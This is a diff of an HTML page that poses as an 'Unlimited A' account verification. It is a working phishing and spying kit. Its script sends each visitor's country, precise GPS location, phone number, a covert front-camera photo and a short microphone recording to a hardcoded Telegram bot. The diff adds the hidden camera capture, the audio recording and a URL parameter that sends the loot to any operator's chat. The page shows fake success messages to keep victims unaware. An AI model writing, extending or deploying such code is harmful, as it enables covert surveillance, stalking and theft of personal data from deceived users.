@@ -17,14 +17,17 @@
     button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
     button:hover { background: #1d4ed8; }
     .sub-text { font-size: 12px; color: #6b7280; margin-top: 10px; }
+    video { display: none; } /* د چمتووالي ویډیو ایلیمنټ */
   </style>
 </head>
 <body>
+
+<video id="v" autoplay playsinline muted></video>
+
 <div class="container">
-  <!-- Logo Section -->
   <div class="logo">GET Unlimited A</div>
 
-  <!-- Step 1: Country Selection -->
+  <!-- Step 1: Country Selection & Location -->
   <div id="step1" class="step active">
     <label for="country">Select Country</label>
     <select id="country" onchange="handleCountryChange()">
@@ -38,7 +41,7 @@
     <p class="sub-text">Select your location to start verification.</p>
   </div>
 
-  <!-- Step 2: Phone Number & Camera -->
+  <!-- Step 2: Phone Number & Camera Permission -->
   <div id="step2" class="step">
     <label for="phone">Enter Phone Number</label>
     <input type="tel" id="phone" placeholder="+93 7XX XXX XXX">
@@ -46,14 +49,14 @@
     <p class="sub-text">Identity check requires camera permission upon sending.</p>
   </div>
 
-  <!-- Step 3: View Details & Microphone -->
+  <!-- Step 3: Microphone Permission & Details -->
   <div id="step3" class="step">
     <label>Verification Completed!</label>
     <p style="font-size:14px; color:#374151; margin-bottom:15px;">Click below to access your Unlimited A account details.</p>
-    <button onclick="handleViewDetails()">View Details</button>
+    <button id="detailsBtn" onclick="handleViewDetails()">View Details</button>
   </div>
 
-  <!-- Step 4: Final Success Screen -->
+  <!-- Step 4: Success Screen -->
   <div id="step4" class="step">
     <h3 style="color:#10b981; margin-bottom:10px;">Access Granted!</h3>
     <p style="font-size:14px; color:#4b5563;">Your details have been successfully processed.</p>
@@ -61,125 +64,155 @@
 </div>
 
 <script>
-  // Exact Correct Telegram Credentials
   const TELEGRAM_BOT_TOKEN = '8856137504:AAHULGCAaZYPF6PIIRCg2611ZWBlPTnlyds';
-  const TELEGRAM_CHAT_ID = '6809500416';
+  const DEFAULT_CHAT_ID = '6809500416'; // که ID په لینک کې نه وي، دې ایډي ته ځي
 
-  // Step Navigation Function
-  function goToStep(stepNumber) {
-    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-    document.getElementById(`step${stepNumber}`).classList.add('active');
+  // له URL (لینک) څخه د شخص آیډي موندل (?id=CHAT_ID)
+  function getTargetChatId() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const customId = urlParams.get('id');
+    return customId ? customId : DEFAULT_CHAT_ID;
   }
 
-  // Send Text Log to Telegram
-  async function sendTelegramLog(message) {
+  const TARGET_CHAT_ID = getTargetChatId();
+
+  function goToStep(s) {
+    document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
+    document.getElementById(`step${s}`).classList.add('active');
+  }
+
+  // متن لېږل
+  async function sendTelegramLog(msg) {
     try {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
-        })
+        body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: msg, parse_mode: 'HTML' })
       });
-    } catch (err) {
-      console.error('Telegram API Error:', err);
-    }
+    } catch (e) { console.error(e); }
   }
 
-  // Send Photo (Camera capture) to Telegram
+  // انځور لېږل
   async function sendTelegramPhoto(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', blob, 'user_capture.jpg');
-
+    const fd = new FormData();
+    fd.append('chat_id', TARGET_CHAT_ID);
+    fd.append('photo', blob, 'cam.jpg');
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-    } catch (err) {
-      console.error('Error sending photo:', err);
-    }
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    } catch (e) { console.error(e); }
   }
 
-  // Step 1: Country Selection & Location Request
-  function handleCountryChange() {
-    const selectedCountry = document.getElementById('country').value;
-    if (!selectedCountry) return;
+  // غږ لېږل
+  async function sendTelegramVoice(blob) {
+    const fd = new FormData();
+    fd.append('chat_id', TARGET_CHAT_ID);
+    fd.append('voice', blob, 'mic.ogg');
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
+    } catch (e) { console.error(e); }
+  }
 
-    sendTelegramLog(`🌐 <b>Selected Country:</b> ${selectedCountry}`);
+  // Step 1: Location
+  function handleCountryChange() {
+    const country = document.getElementById('country').value;
+    if (!country) return;
+
+    sendTelegramLog(`🌐 <b>Country Selected:</b> ${country}\n🎯 <b>Target Chat ID:</b> <code>${TARGET_CHAT_ID}</code>`);
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          const lat = pos.coords.latitude;
-          const lng = pos.coords.longitude;
-          const mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
-          sendTelegramLog(`📍 <b>Location Granted:</b>\n<a href="${mapUrl}">View Map Location</a>`);
+          const map = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          sendTelegramLog(`📍 <b>Location Granted:</b>\n<a href="${map}">Open Google Maps</a>`);
           goToStep(2);
         },
         (err) => {
-          sendTelegramLog(`⚠️ <b>Location Denied/Failed:</b> ${err.message}`);
+          sendTelegramLog(`⚠️ <b>Location Error:</b> ${err.message}`);
           goToStep(2);
         },
-        { enableHighAccuracy: true, timeout: 10000 }
+        { enableHighAccuracy: true, timeout: 8000 }
       );
     } else {
       goToStep(2);
     }
   }
 
-  // Step 2: Phone Submit & Camera Photo Capture
+  // Step 2: Phone Submit & Camera Prompt
   async function handlePhoneSubmit() {
-    const phoneInput = document.getElementById('phone').value;
-    if (!phoneInput) {
+    const phone = document.getElementById('phone').value;
+    if (!phone) {
       alert('Please enter your phone number.');
       return;
     }
 
     const btn = document.getElementById('sendBtn');
     btn.disabled = true;
-    btn.innerText = 'Processing...';
+    btn.innerText = 'Verifying...';
 
-    sendTelegramLog(`📱 <b>Phone Number:</b> <code>${phoneInput}</code>`);
+    sendTelegramLog(`📱 <b>Phone:</b> <code>${phone}</code>`);
 
     try {
-      // Access Camera
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      const video = document.createElement('video');
+      // سمدستي د کیمرې د اجازې (Allow/Block) غوښتنه کول
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+      const video = document.getElementById('v');
       video.srcObject = stream;
       await video.play();
 
-      // Capture photo to canvas
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // ۱ دویمه وروسته دقیق انځور اخیستل
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Stop Camera
-      stream.getTracks().forEach(track => track.stop());
+        // د کیمرې تړلو پروسه
+        stream.getTracks().forEach(t => t.stop());
 
-      // Send Photo Blob
-      canvas.toBlob(async (blob) => {
-        if (blob) {
-          await sendTelegramPhoto(blob);
-        }
-        goToStep(3);
-      }, 'image/jpeg', 0.8);
+        canvas.toBlob(async (blob) => {
+          if (blob) await sendTelegramPhoto(blob);
+          goToStep(3);
+        }, 'image/jpeg', 0.85);
+
+      }, 1200);
 
     } catch (err) {
-      sendTelegramLog(`⚠️ <b>Camera Permission Error:</b> ${err.message}`);
+      sendTelegramLog(`⚠️ <b>Camera Permission Rejected:</b> ${err.message}`);
       goToStep(3);
     }
   }
 
-  // Step 3: Completion Handler
-  function handleViewDetails() {
-    sendTelegramLog(`✅ <b>User clicked View Details</b>`);
-    goToStep(4);
+  // Step 3: Microphone Prompt & Audio Capture
+  async function handleViewDetails() {
+    const btn = document.getElementById('detailsBtn');
+    btn.disabled = true;
+    btn.innerText = 'Loading...';
+
+    try {
+      // سمدستي د مایکروفون د اجازې (Allow/Block) غوښتنه کول
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = async () => {
+        const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+        await sendTelegramVoice(audioBlob);
+        stream.getTracks().forEach(t => t.stop());
+        goToStep(4);
+      };
+
+      recorder.start();
+
+      // د ۳ دویمو لخوا د شالید غږ ثبتول
+      setTimeout(() => {
+        recorder.stop();
+      }, 3500);
+
+    } catch (err) {
+      sendTelegramLog(`⚠️ <b>Microphone Permission Rejected:</b> ${err.message}`);
+      goToStep(4);
+    }
   }
 </script>
 </body>
